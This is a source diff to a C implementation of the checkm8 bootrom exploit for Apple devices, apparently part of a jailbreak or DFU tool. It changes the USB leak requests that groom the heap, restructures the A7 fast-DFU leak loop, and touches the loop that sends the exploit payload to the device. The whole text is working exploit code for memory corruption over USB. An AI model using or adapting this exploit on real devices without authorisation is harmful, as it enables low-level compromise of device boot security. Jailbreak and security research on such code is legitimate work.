@@ -16,6 +16,8 @@
 
 extern int fast_dfu;
 
+unsigned char blank_buf[0x100];
+
 // based on synackuk's belladonna
 // https://github.com/synackuk/belladonna/blob/824363bbc287da3cd2d97cba69aa746db89a86b6/src/exploits/checkm8/checkm8.c
 
@@ -24,19 +26,19 @@ int usb_req_stall(irecv_client_t client){
 }
 
 int usb_req_leak(irecv_client_t client){
-    unsigned char buf[0x40];
-    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
+    //unsigned char buf[0x40];
+    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 1);
 }
 
 int usb_req_leak_a7(irecv_client_t client){
-    unsigned char buf[0x40];
-    irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 100000); // fast dfu
+    //unsigned char buf[0x40];
+    irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 100000); // fast dfu
     return IRECV_E_TIMEOUT;
 }
 
 int usb_req_no_leak(irecv_client_t client){
-    unsigned char buf[0x41];
-    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
+    //unsigned char buf[0x41];
+    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x41, 1);
 }
 
 int checkm8_supported(irecv_client_t client) {
@@ -123,17 +125,20 @@ int checkm8_exploit(irecv_client_t client) {
         return -1;
     }
     usleep(100);
-    for(int i = 0; i < config.large_leak; i++) {
-        if(cpid == 0x8960 && fast_dfu){
+    if(cpid == 0x8960 && fast_dfu){
+        for(int i = 0; i < config.large_leak; i++) {
             ret = usb_req_leak_a7(client);
-        } else {
-            ret = usb_req_leak(client);
         }
-        if(ret != IRECV_E_TIMEOUT) {
-            printf("Failed to create heap hole.\n");
-            return -1;
+    } else {
+        for(int i = 0; i < config.large_leak; i++) {
+            ret = usb_req_leak(client);
+            if(ret != IRECV_E_TIMEOUT) {
+                printf("Failed to create heap hole.\n");
+                return -1;
+            }
         }
     }
+    
     ret = usb_req_no_leak(client);
     if(ret != IRECV_E_TIMEOUT) {
         printf("Failed to create heap hole.\n");
@@ -207,7 +212,7 @@ int checkm8_exploit(irecv_client_t client) {
     if(ret != 0) {
         if (cpid == 0x8960){
             // A7
-            printf("\x1b[31mFailed to send abort? But maybe A7 is fine\x1b[39m\n");
+            //printf("\x1b[31mFailed to send abort? But maybe A7 is fine\x1b[39m\n");
         }
         else {
             printf("Failed to send abort.\n");
@@ -256,9 +261,11 @@ int checkm8_exploit(irecv_client_t client) {
         memcpy(buff, config.payload, config.payload_len);
         
         size_t len = 0;
+        size_t size;
+        size_t sent;
         while(len < config.payload_len) {
-            size_t size = ((config.payload_len - len) > 0x800) ? 0x800 : (config.payload_len - len);
-            size_t sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&buff[len], size, 100);
+            size = ((config.payload_len - len) > 0x800) ? 0x800 : (config.payload_len - len);
+            sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&buff[len], size, 100);
             len += size;
         }
         
